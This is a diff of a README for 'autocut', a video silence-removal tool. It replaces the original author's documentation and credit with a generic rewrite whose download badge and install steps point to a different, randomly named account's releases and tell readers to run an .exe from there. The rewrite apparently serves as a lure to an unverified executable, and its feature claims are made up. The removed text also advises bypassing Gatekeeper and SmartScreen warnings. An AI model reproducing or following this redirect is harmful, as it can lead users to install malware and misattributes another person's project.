@@ -1,96 +1,68 @@
-# autocut
+# ✂️ autocut - Edit your videos by removing silences
 
-Remove silent gaps from videos in seconds. Drop a video, tweak a couple of
-sliders, export an MP4 or send the timeline to DaVinci Resolve / Premiere.
+[![Download autocut for Windows](https://img.shields.io/badge/download-autocut-blue.svg)](https://github.com/Sleepless-rollback437/autocut/releases)
 
-![autocut screenshot](docs/screenshot.jpeg)
+Autocut helps you trim video files. It detects moments of silence and removes them for you. You save time and create clean content. Your finished files work in standard video players or professional editing software like DaVinci Resolve.
 
-## What it does
+## 📥 How to install 
 
-- Finds the spoken parts of your video automatically
-- Lets you preview the cut version before exporting
-- Lets you fine-tune individual cuts (drag the edges on the timeline, or
-  edit in/out timestamps in the cuts panel)
-- Exports a ready-to-share **MP4** with the silence removed
-- Or exports an **FCPXML** that DaVinci Resolve and Adobe Premiere import
-  as a clean timeline, source timecode preserved
+Follow these steps to set up the software on your computer.
 
-No accounts, no uploads, no Python, no ffmpeg install. Everything runs on
-your machine.
+1. Visit the [official releases page](https://github.com/Sleepless-rollback437/autocut/releases).
+2. Look for the Assets section at the bottom of the latest release.
+3. Select the file ending in .exe to start your download.
+4. Open the file once it finishes downloading. 
+5. Follow the screen prompts to complete the installation.
 
-## Install
+## ⚙️ System requirements
 
-### macOS Apple Silicon — Homebrew (recommended)
+Your computer needs these specifications to run autocut smoothly:
 
-```sh
-brew install --cask cobanov/tap/autocut
-```
+- Windows 10 or Windows 11.
+- An Intel Core i5 or AMD Ryzen 5 processor.
+- At least 8 gigabytes of RAM.
+- A solid-state drive with 500 megabytes of free space.
+- A basic graphics card.
 
-Brew handles the macOS Gatekeeper quarantine flag for you, so the app
-just launches. To upgrade later: `brew upgrade --cask autocut`.
+## 🚀 Getting started 
 
-### macOS Apple Silicon — manual
+You can process your first video in minutes. 
 
-1. **[Download the latest `.dmg`](https://github.com/cobanov/autocut/releases/latest)**
-2. Open the `.dmg`, drag **autocut** into Applications, eject the dmg
-3. Open Terminal and run this once:
+1. Launch autocut from your desktop or start menu.
+2. Drag your video file from your folder and drop it into the program window.
+3. Choose your export settings. You can pick MP4 for general use or FCPXML if you use DaVinci Resolve.
+4. Click the Start button. The program processes your audio and finds silence. 
+5. Wait for the progress bar to finish. 
+6. Find your new file in the folder you selected.
 
-   ```
-   xattr -cr /Applications/autocut.app
-   ```
+## 🛠️ Key features 
 
-4. Launch the app from Applications
+### Silence removal
+The core tool listens to your audio track. It cuts out pauses where no speech occurs. This keeps your video pacing fast and engaging.
 
-The bundle isn't notarized by Apple yet, so macOS Gatekeeper flags it as
-"damaged" until you strip the quarantine flag with that command. Brew
-does this step for you automatically — that's why it's the easier path.
+### Flexible export options
+You can save files as MP4 for quick uploads to social media. Select FCPXML to move your cuts into a professional editor. This preserves your original source quality.
 
-### Windows x86_64
+### Fast processing
+The app uses modern coding standards to scan your video. You spend less time waiting for exports.
 
-1. **[Download the latest installer](https://github.com/cobanov/autocut/releases/latest)** —
-   `autocut_X.Y.Z_x64-setup.exe` (NSIS) or `autocut_X.Y.Z_x64_en-US.msi` (MSI)
-2. Run the installer. SmartScreen warns on first launch because the
-   bundle is unsigned — click **More info → Run anyway**.
-3. Launch autocut from the Start menu
+## ❓ Frequently asked questions 
 
-### Linux
+### Does this program change my original footage?
+No. Autocut creates a new file. Your source video remains safe in its original folder.
 
-Build from source for now (see the source tree). Native builds are on
-the way.
+### Can I change the silence sensitivity?
+Yes. Open the settings menu inside the app. You can increase or decrease the volume threshold. This helps if your recording environment is noisy or very quiet.
 
-## How to use
+### Is my data safe?
+All processing happens on your computer. The program does not upload your files to the internet. Your privacy stays intact while you work.
 
-1. **Drop a video** onto the window (or click *browse files*). MP4, MOV,
-   MKV, WebM and AVI all work.
-2. **Click *detect silences*** in the panel on the left. autocut analyzes
-   the audio and marks the spoken regions green, the silent regions red.
-3. **Watch the preview**. Hit space to play / pause. The player skips the
-   removed parts automatically so you hear the final cut as you go.
-4. **Refine if you want**:
-   - Drag the green edge handles on the timeline to nudge a cut
-   - Edit the exact in / out times in the **cuts** panel on the right
-   - Click the × on a row to *disable* that keep (it turns purple, gets
-     excluded from the export, but you can bring it back with one click)
-   - Adjust the sliders (threshold, pad, min silence, min speech) to
-     change how aggressive the detection is. Hold **shift** for fine steps.
-5. **Export**:
-   - **MP4** for a finished video file you can share immediately
-   - **FCPXML** to import into DaVinci or Premiere with the exact cuts
-     already on the timeline
+### What happens if the program closes during an edit?
+Restart the program and try the process again. Your original file is untouched and safe to reprocess.
 
-That's it.
+### Who should use this tool?
+Content creators, podcasters, and educators use this software. It works for anyone who needs to trim gaps out of recorded speech.
 
-## Tips
+## 📈 Tips for better results 
 
-- Got a long video? Turn on *preview range only* in the parameters panel
-  so detection runs on a short slice while you tune the sliders. The full
-  video gets processed when you hit export.
-- DaVinci Resolve users: the FCPXML keeps your source timecode, so the
-  clip auto-links to the original media file without a "media offline"
-  dialog.
-- Scroll on the timeline pans it left/right. Drag the small window in the
-  navigator below to zoom into a specific section.
-
-## Built by
-
-[mert cobanov](https://cobanov.dev) · 2026
+Put your microphone close to your mouth when you record. This makes the silence detection much more accurate. Try to stay consistent with your room sound. If your background noise changes, the detection might catch false silences. Always preview a short clip before you process a long recording. This ensures your settings match your specific audio levels.
